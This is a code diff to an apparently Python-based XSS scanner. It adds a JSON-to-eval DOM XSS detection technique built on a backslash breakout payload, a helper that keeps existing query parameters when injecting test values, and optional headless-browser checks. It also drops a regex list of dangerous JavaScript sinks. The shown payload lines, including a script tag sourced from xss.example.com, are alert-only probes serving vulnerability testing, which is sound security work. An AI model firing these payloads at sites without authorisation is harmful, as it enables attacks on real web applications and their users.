@@ -76,6 +76,9 @@ XSS_PAYLOADS = [
     "<<SCRIPT>alert('XSS');//<</SCRIPT>",
     "<SCRIPT SRC=http://xss.example.com/xss.js></SCRIPT>",
 ]
+JSON_EVAL_DOM_BREAKOUT_PAYLOAD = '\\"-alert(1)}//'
+JSON_EVAL_DOM_TECHNIQUE_ID = "dom_xss_json_eval_backslash_breakout"
+JSON_EVAL_DOM_TECHNIQUE_NAME = "Backslash escape bypass in JSON-to-eval DOM flow"
 
 class FormParser(HTMLParser):
     """Parse HTML to extract forms and their inputs"""
@@ -259,7 +262,7 @@ def test_reflected_xss(url: str, timeout: int = 10) -> List[Dict]:
 
 def test_dom_xss(url: str, timeout: int = 10, browser_verify: bool = False) -> List[Dict]:
     """
-    Test for potential DOM-based XSS by looking for dangerous JavaScript patterns.
+    Test for DOM-based XSS using concrete source-to-sink patterns.
     
     Args:
         url: Target URL to test
@@ -269,22 +272,6 @@ def test_dom_xss(url: str, timeout: int = 10, browser_verify: bool = False) -> L
         List of dictionaries containing vulnerability details
     """
     vulnerabilities = []
-    found_patterns = set()  # Track which patterns we've already reported
-    
-    # Dangerous JavaScript patterns that could lead to DOM XSS
-    dangerous_patterns = [
-        r'document\.write\s*\(',
-        r'document\.writeln\s*\(',
-        r'\.innerHTML\s*=',
-        r'\.outerHTML\s*=',
-        r'eval\s*\(',
-        r'setTimeout\s*\(',
-        r'setInterval\s*\(',
-        r'Function\s*\(',
-        r'location\.href\s*=',
-        r'location\.replace\s*\(',
-        r'location\.assign\s*\(',
-    ]
     
     def _select_dom_payload(candidates: List[str]) -> str:
         # Prefer payloads without quotes and with svg tag when available
@@ -298,6 +285,25 @@ def test_dom_xss(url: str, timeout: int = 10, browser_verify: bool = False) -> L
 
     def _adaptive_prefix_variants(payload: str) -> List[str]:
         return [f'\">{payload}', f"'>{payload}"]
+
+    def _merge_query(url_in: str, updates: Dict[str, str]) -> str:
+        """
+        Preserve existing query parameters while injecting/overriding one parameter.
+        This matters for pages where the sink only exists on specific parameterized endpoints.
+        """
+        try:
+            parsed = urllib.parse.urlparse(url_in)
+            existing = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+            # Flatten to single value per key for URL generation.
+            flat = {k: (v[0] if isinstance(v, list) and v else "") for k, v in existing.items()}
+            for k, v in (updates or {}).items():
+                flat[k] = v
+            new_query = urllib.parse.urlencode(flat, doseq=False)
+            return urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
+        except Exception:
+            # Fallback: last resort, drop existing query (older behavior).
+            base = url_in.split("#")[0].split("?")[0]
+            return f"{base}?{urllib.parse.urlencode(updates or {})}"
 
     try:
         with httpx.Client(timeout=timeout, follow_redirects=True, verify=False) as client:
@@ -335,8 +341,10 @@ def test_dom_xss(url: str, timeout: int = 10, browser_verify: bool = False) -> L
                 if write_sink or direct_sink:
                     candidates = XSSPayloads.HTML_CONTEXT + XSSPayloads.EVENT_HANDLERS
                     payload = _select_dom_payload(candidates)
-                    for variant in _adaptive_prefix_variants(payload):
-                        poc_url = f"{url.split('?')[0]}?{urllib.parse.urlencode({param_name: variant})}"
+                    variants = _adaptive_prefix_variants(payload)
+
+                    for variant in variants:
+                        poc_url = _merge_query(url, {param_name: variant})
                         verified = False
                         if browser_verify:
                             log(f"Verifying DOM XSS in headless browser: {poc_url}", 'INFO')
@@ -365,39 +373,85 @@ def test_dom_xss(url: str, timeout: int = 10, browser_verify: bool = False) -> L
                         log(f'DOM XSS PoC generated for parameter {param_name}', 'VULN')
                         break
 
-            for pattern in dangerous_patterns:
-                matches = re.finditer(pattern, response.text, re.IGNORECASE)
-                match_count = 0
-                first_context = None
-                
-                for match in matches:
-                    match_count += 1
-                    # Only store the first match context
-                    if first_context is None:
-                        start = max(0, match.start() - 50)
-                        end = min(len(response.text), match.end() + 50)
-                        first_context = response.text[start:end].replace('\n', ' ')
-                
-                # Only report this pattern once, even if found multiple times
-                if match_count > 0 and pattern not in found_patterns:
-                    found_patterns.add(pattern)
-                    
-                    # Include count in description if multiple instances found
-                    if match_count > 1:
-                        description = f'Potentially dangerous JavaScript pattern found ({match_count} instances): {pattern}'
-                    else:
-                        description = f'Potentially dangerous JavaScript pattern found: {pattern}'
-                    
-                    vuln = {
-                        'type': 'potential_dom_xss',
-                        'pattern': pattern,
-                        'count': match_count,
-                        'context': first_context,
-                        'severity': 'medium',
-                        'description': description
-                    }
-                    vulnerabilities.append(vuln)
-                    log(f'DOM XSS pattern: {pattern} ({match_count} instance{"s" if match_count > 1 else ""})', 'VULN')
+            # Technique: query parameter reflected into JSON data that is later evaluated with eval().
+            try:
+                script_refs = re.findall(
+                    r'<script[^>]+src=["\']([^"\']+)["\']',
+                    response.text or "",
+                    re.IGNORECASE,
+                )
+                candidates = []
+                for s in script_refs[:12]:
+                    script_url = urllib.parse.urljoin(str(response.url), s)
+                    p = urllib.parse.urlparse(script_url)
+                    if p.scheme not in ("http", "https"):
+                        continue
+                    if p.netloc != urllib.parse.urlparse(str(response.url)).netloc:
+                        continue
+                    candidates.append(script_url)
+
+                has_eval_json_flow = False
+                flow_params: List[str] = []
+                for script_url in candidates:
+                    try:
+                        script_resp = client.get(script_url)
+                    except Exception:
+                        continue
+                    js_body = script_resp.text or ""
+                    if not re.search(r'\beval\s*\(', js_body, re.IGNORECASE):
+                        continue
+                    has_json_hint = bool(
+                        re.search(r'\bJSON\.parse\s*\(|\bapplication/json\b|\.json\s*\(', js_body, re.IGNORECASE)
+                    )
+                    has_data_fetch = bool(
+                        re.search(r'\bfetch\s*\(|XMLHttpRequest|\.open\s*\(\s*[\'\"]GET[\'\"]', js_body, re.IGNORECASE)
+                    )
+                    if has_json_hint or has_data_fetch:
+                        has_eval_json_flow = True
+                    flow_params.extend(
+                        re.findall(
+                            r'URLSearchParams\(\s*(?:window\.)?location\.search\s*\)\.get\(\s*[\'"]([^\'"]+)[\'"]\s*\)',
+                            js_body,
+                            re.IGNORECASE,
+                        )
+                    )
+
+                if has_eval_json_flow:
+                    param_candidates = [p for p in dict.fromkeys(flow_params) if p]
+                    if not param_candidates:
+                        param_candidates = ["search", "q", "query", "keyword", "term"]
+                    for pname in param_candidates[:3]:
+                        poc_url = _merge_query(url, {pname: JSON_EVAL_DOM_BREAKOUT_PAYLOAD})
+                        verified = False
+                        if browser_verify:
+                            log(f"Verifying JSON/eval DOM XSS in headless browser: {poc_url}", "INFO")
+                            verified = verify_alert_with_playwright(poc_url)
+                            log(f"JSON/eval DOM XSS browser verification result: {verified}", "INFO")
+
+                        vuln = {
+                            "type": "dom_xss",
+                            "pattern": "query-parameter -> JSON data -> eval()",
+                            "parameter": pname,
+                            "payload": JSON_EVAL_DOM_BREAKOUT_PAYLOAD,
+                            "url": poc_url,
+                            "severity": "high" if verified else "medium",
+                            "technique_id": JSON_EVAL_DOM_TECHNIQUE_ID,
+                            "technique_name": JSON_EVAL_DOM_TECHNIQUE_NAME,
+                            "description": "Potential DOM XSS via backslash escape bypass in JSON data evaluated with eval()" + (" (verified)" if verified else " (pattern matched, not browser-verified)"),
+                            "exploitation": {
+                                "browser_steps": [
+                                    f"Open: {poc_url}",
+                                    "Observe an alert dialog if the payload executes in the eval() flow.",
+                                ]
+                            },
+                            "verified": bool(verified),
+                        }
+                        vulnerabilities.append(vuln)
+                        log("DOM XSS JSON/eval technique PoC generated", "VULN")
+                        if verified:
+                            break
+            except Exception:
+                pass
     
     except Exception as e:
         log(f'DOM XSS scanner error: {str(e)}', 'ERROR')
